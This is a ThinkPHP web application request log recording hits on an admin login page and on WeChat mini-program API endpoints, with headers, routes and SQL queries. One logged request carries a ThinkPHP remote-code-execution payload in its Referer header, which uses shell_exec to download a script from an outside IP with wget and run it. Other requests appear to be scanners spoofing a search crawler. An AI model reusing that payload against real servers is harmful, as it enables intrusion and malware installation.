---------------------------------------------------------------
[ 2019-02-13T00:28:43+08:00 ] 184.154.74.66 GET /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,212.70kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'http://218.242.163.21/',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T02:23:28+08:00 ] 217.61.105.126 GET /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,212.68kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'referer' => 'http://218.242.163.21:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;rm%20-rf%20sh;wget%20http://185.244.25.148/sh;%20chmod%20777%20sh;./sh%20thinkphp',
  'user-agent' => 'Go 1.1 package http',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T03:15:36+08:00 ] 185.53.88.48 GET /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,211.48kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T03:39:58+08:00 ] 80.82.77.139 GET /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,212.59kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'host' => 'picc.18178.net',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.015600s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T09:41:21+08:00 ] 232.188.126.212 HEAD /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,214.26kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'picc.18178.net',
  'referer' => 'https://www.baidu.com/',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html',
  'content-type' => 'text/html',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'via' => '232.188.126.212',
  'forwarded' => '232.188.126.212',
  'forwarded-for' => '232.188.126.212',
  'x-forwarded' => '232.188.126.212',
  'x-forwarded-for' => '232.188.126.212',
  'x-cluster-client-ip' => '232.188.126.212',
  'client-ip' => '232.188.126.212',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T09:46:10+08:00 ] 69.42.58.94 HEAD /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,214.28kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'picc.18178.net',
  'referer' => 'https://www.baidu.com/',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html',
  'content-type' => 'text/html',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'via' => '69.42.58.94',
  'forwarded' => '69.42.58.94',
  'forwarded-for' => '69.42.58.94',
  'x-forwarded' => '69.42.58.94',
  'x-forwarded-for' => '69.42.58.94',
  'x-cluster-client-ip' => '69.42.58.94',
  'client-ip' => '69.42.58.94',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.015600s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T09:47:34+08:00 ] 43.140.177.71 HEAD /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,214.27kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'picc.18178.net',
  'referer' => 'https://www.baidu.com/',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html',
  'content-type' => 'text/html',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'via' => '43.140.177.71',
  'forwarded' => '43.140.177.71',
  'forwarded-for' => '43.140.177.71',
  'x-forwarded' => '43.140.177.71',
  'x-forwarded-for' => '43.140.177.71',
  'x-cluster-client-ip' => '43.140.177.71',
  'client-ip' => '43.140.177.71',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T14:35:04+08:00 ] 115.171.20.13 GET /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,178.81kb] [文件加载：77]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'picc.18178.net',
  'accept-language' => 'en-US,*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T14:35:06+08:00 ] 115.171.20.13 GET /relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1550039704
[ info ] picc.18178.net/relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1550039704 [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,182.45kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'ajax',
    2 => 'lang',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'picc.18178.net',
  'accept-language' => 'en-US,*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'cookie' => 'PHPSESSID=69m5pduarp9il8v70jfcnkg4l2',
  'user-agent' => 'Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1',
  'referer' => 'https://picc.18178.net/relaxed/public/index.php/admin/index/login',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'callback' => 'define',
  'controllername' => 'index',
  'v' => '1550039704',
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Ajax->lang[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Ajax.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T15:35:04+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/userinfo/affiche
[ info ] picc.18178.net/relaxed/public/index.php/api/userinfo/affiche [运行时间：0.468001s][吞吐率：2.14req/s] [内存消耗：2,461.23kb] [文件加载：76]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'userinfo',
    2 => 'affiche',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '2',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Userinfo->affiche[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Userinfo.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.249601s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_affiche` [ RunTime:0.031200s ]
[ sql ] [ SQL ] SELECT `content` FROM `fa_affiche` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_turntable` [ RunTime:0.031200s ]
[ sql ] [ SQL ] SELECT `name` FROM `fa_turntable` WHERE  `name` <> '谢谢参与' [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:04+08:00 ] 112.64.68.53 GET /relaxed/public/index.php/api/content/slideshow
[ info ] picc.18178.net/relaxed/public/index.php/api/content/slideshow [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：2,460.10kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'slideshow',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'br, gzip, deflate',
  'accept-language' => 'zh-cn',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->slideshow[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_gslideshow` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT `image`,`url` FROM `fa_gslideshow` WHERE  `status` = 'normal' [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:05+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/shangpin
[ info ] picc.18178.net/relaxed/public/index.php/api/content/shangpin [运行时间：0.234000s][吞吐率：4.27req/s] [内存消耗：2,464.25kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'shangpin',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '2',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->shangpin[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.046800s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_turntable` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT * FROM `fa_turntable` [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:05+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/turndesc
[ info ] picc.18178.net/relaxed/public/index.php/api/content/turndesc [运行时间：0.234000s][吞吐率：4.27req/s] [内存消耗：2,457.78kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'turndesc',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '2',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->turndesc[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.046800s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_turndesc` [ RunTime:0.031200s ]
[ sql ] [ SQL ] SELECT * FROM `fa_turndesc` LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:05+08:00 ] 112.64.68.53 GET /relaxed/public/index.php/api/content/activity
[ info ] picc.18178.net/relaxed/public/index.php/api/content/activity [运行时间：0.265200s][吞吐率：3.77req/s] [内存消耗：2,463.18kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'activity',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'br, gzip, deflate',
  'accept-language' => 'zh-cn',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
